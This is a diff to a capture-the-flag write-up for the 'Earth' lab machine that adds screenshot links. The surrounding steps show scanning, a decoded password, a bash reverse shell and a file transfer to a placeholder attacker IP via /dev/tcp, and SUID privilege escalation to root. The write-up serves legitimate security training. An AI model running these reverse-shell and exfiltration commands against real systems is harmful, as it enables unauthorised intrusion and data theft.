@@ -61,6 +61,7 @@ The target machine was first identified by performing an ARP scan across the loc
 ```bash
 arp-scan --localnet
 ```
+![](Screenshots/01_Arp.png)
 
 The VirtualBox guest was identified by its Oracle-assigned MAC address prefix (`08`), allowing the target IP address to be distinguished from other devices on the network.
 
@@ -69,6 +70,7 @@ After identifying the target, an Nmap scan was performed to enumerate exposed se
 ```bash
 nmap -APn -p- <TARGET-IP>
 ```
+![](Screenshots/02_Nmap.png)
 
 The scan revealed three primary services:
 
@@ -102,6 +104,7 @@ dirb http://earth.local
 ```bash
 dirb https://terratest.earth.local
 ```
+![](Screenshots/04_terratestdirb.png)
 
 The enumeration revealed several interesting resources, including a `robots.txt` file on the HTTPS virtual host.
 
@@ -136,6 +139,7 @@ One of the decoded outputs produced readable plaintext resembling:
 ```text
 Earthclimatechangebad4humans
 ```
+![](Screenshots/08_XORdecrypt.png)
 
 The repeated plaintext appeared to represent a potential password and was selected for authentication testing.
 
@@ -190,6 +194,7 @@ nc -nlvp 10000
 ```bash
 bash -i >& /dev/tcp/<ATTACKER-IP>/10000 0>&1
 ```
+![](Screenshots/13_bash.png)
 
 This established a remote shell from the target machine back to the attacker, allowing commands to be executed directly from the Kali terminal.
 
@@ -214,6 +219,7 @@ Privilege escalation began by enumerating executables with the SUID permission s
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 ```
+![](Screenshots/15_SUID.png)
 
 This command searches the filesystem for files that execute with the permissions of their owner while suppressing permission-related errors. During enumeration, a custom SUID binary named `reset_root` was identified, making it the primary target for further investigation.
 
@@ -234,6 +240,8 @@ nc -nlvp 443 > reset_root
 ```bash
 cat /path/to/reset_root > /dev/tcp/<ATTACKER-IP>/443
 ```
+
+![](Screenshots/16_resetroot.png)
 
 The binary was then inspected locally using common Linux analysis tools.
 
@@ -256,6 +264,7 @@ The `ltrace` output revealed the following required trigger files:
 /dev/shm/Zw7bV9U5
 /tmp/kcM0Wewe
 ```
+![](Screenshots/07_ltrace.png)
 
 Since these files did not exist on the target system, the program terminated without performing any privileged action. This indicated that satisfying these checks was required before the binary would continue execution.
 
@@ -314,6 +323,7 @@ After obtaining root privileges, the root directory became accessible.
 cd /root
 cat flag.txt
 ```
+![](Screenshots/18_filesandflag.png)
 
 Reading the root flag confirmed successful completion of the Earth machine and full system compromise.
 
